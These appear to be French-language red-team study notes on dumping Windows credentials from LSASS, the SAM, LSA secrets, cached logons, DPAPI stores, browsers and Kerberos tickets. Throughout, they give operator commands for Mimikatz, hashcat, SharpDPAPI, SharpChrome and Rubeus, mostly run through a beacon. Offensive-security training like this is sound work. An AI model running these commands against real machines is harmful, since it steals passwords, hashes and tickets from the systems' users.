# LSASS Memory

Le Local Security Authority Subsystem Service (LSASS) sous Windows est responsable de la vérification des credentials des utilisateurs lors de l'authentification, de la gestion des changements de mot de passe, de la création des jetons d'accès, etc. Un attaquant peut être en mesure de lire les mots de passe mis en cache dans la mémoire du processus LSASS.

Microsoft fournit la Security Support Provider Interface (SSPI), leur implémentation de la Generic Security Service API (GSSAPI). Les SSP servent à fournir différents mécanismes d'authentification pour Windows, notamment :
- _NTLM_ pour l'authentification via NTLM et NTLMv2.
- _Kerberos_ pour l'authentification via Kerberos v5.
- _Digest_ pour Lightweight Directory Access Protocol (LDAP) et l'authentification web.
- _Schannel_ pour l'authentification via cryptographie à clé publique, comme TLS et SSL.
- Credential Security Service Provider (_CredSSP_) pour le single sign-on avec Terminal Services et les sessions Remote Desktop.

Chaque SSP est implémenté sous forme de DLL séparées, chargées par LSASS au démarrage du système. Chaque SSP stocke et gère les credentials différemment. Il est utile de le savoir car certains outils, comme Mimikatz, ont des commandes spécifiques selon le SSP visé.
## NTLM Hashes

```
beacon> mimikatz sekurlsa::logonpasswords
```

> Ces hashes peuvent être crackés avec le mode 1000 de Hashcat ou utilisés avec la technique du pass-the-hash.

```
.\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
```
## Kerberos Keys

```
beacon> mimikatz sekurlsa::ekeys
```

> On peut techniquement cracker l'AES256, mais c'est beaucoup plus lent que le NTLM car il est salé.

```
.\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
```

> Cependant, un usage bien plus pratique de ces hashes est de les utiliser pour demander des tickets Kerberos.

---
# Security Account Manager (SAM)

Le Security Account Manager (SAM) stocke les credentials des comptes locaux dans les ruches `HKLM\sam` et `HKLM\system`.

```
beacon> mimikatz !lsadump::sam
```

---
# LSA secrets

Les LSA secrets incluent les mots de passe des comptes de service, le mot de passe du compte machine du domaine, et les clés de chiffrement EFS. Un attaquant peut extraire les secrets mis en cache en mémoire, ou directement depuis la ruche de registre `HKLM/Security/Policy/Secrets`. Ils sont chiffrés, mais la clé est stockée dans `HKLM/Security/Policy`.

```
mimikatz !lsadump::secrets
```

---
# Cached Domain Credentials

Les machines Windows jointes à un domaine mettent souvent en cache les informations de connexion au domaine après l'authentification d'un utilisateur. Cela permet à un utilisateur de se connecter à la machine même si le contrôleur de domaine n'est pas accessible (cas typique des laptops). Le nombre de connexions mises en cache est contrôlé par la clé `CachedLogonCount` dans `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`. Cette valeur va de 0 à 50, la valeur par défaut étant 10.

Les credentials eux-mêmes sont stockés sous une forme hashée appelée MS-Cache v2. Ils ne peuvent pas être utilisés avec des techniques comme le pass-the-hash ; ils doivent être extraits et crackés hors ligne pour récupérer le mot de passe en clair.

```
mimikatz !lsadump::cache

---
* Iteration is set to default (10240)
---
```

```
.\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!
```

---
# DPAPI

Le DPAPI (Data Protection API) est un composant interne du système Windows. Il permet à diverses applications de stocker des données sensibles (ex. mots de passe). Les données sont stockées dans le répertoire de l'utilisateur et sécurisées par des master keys spécifiques à l'utilisateur, dérivées de son mot de passe. Elles se trouvent généralement à :

```
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Des applications comme Google Chrome, Outlook, Internet Explorer ou Skype utilisent le DPAPI. Windows utilise également cette API pour des informations sensibles comme les mots de passe Wi-Fi, les certificats, les mots de passe de connexion RDP, et bien d'autres.

Voici des chemins courants de fichiers cachés contenant généralement des données protégées par DPAPI.

```
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

## Browsers

La procédure spécifique peut varier selon le navigateur utilisé, chacun ayant sa propre implémentation. La plupart des navigateurs basés sur Chromium conservent une base SQLite dans le chemin `%LOCALAPPDATA%\<vendor>\<browser>\User Data\Default\Login Data`.

Par exemple, Chrome stocke sa base de données dans `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`.

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```

## Windows Credential Manager

Le Windows Credential Manager stocke d'autres credentials que l'utilisateur a demandé à Windows de sauvegarder, comme ceux des connexions Remote Desktop. Un attaquant peut déchiffrer ces credentials pour récupérer le mot de passe en clair.

L'utilitaire natif `vaultcmd` permet de voir la présence de credentials sauvegardés.
```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

---
# Extracting Tickets

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap

PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap
```

https://github.com/RalfHacker/Kerbeus-BOF

```
beacon> krb_triage
beacon> krb_dump /user:rsteel /service:krbtgt
```
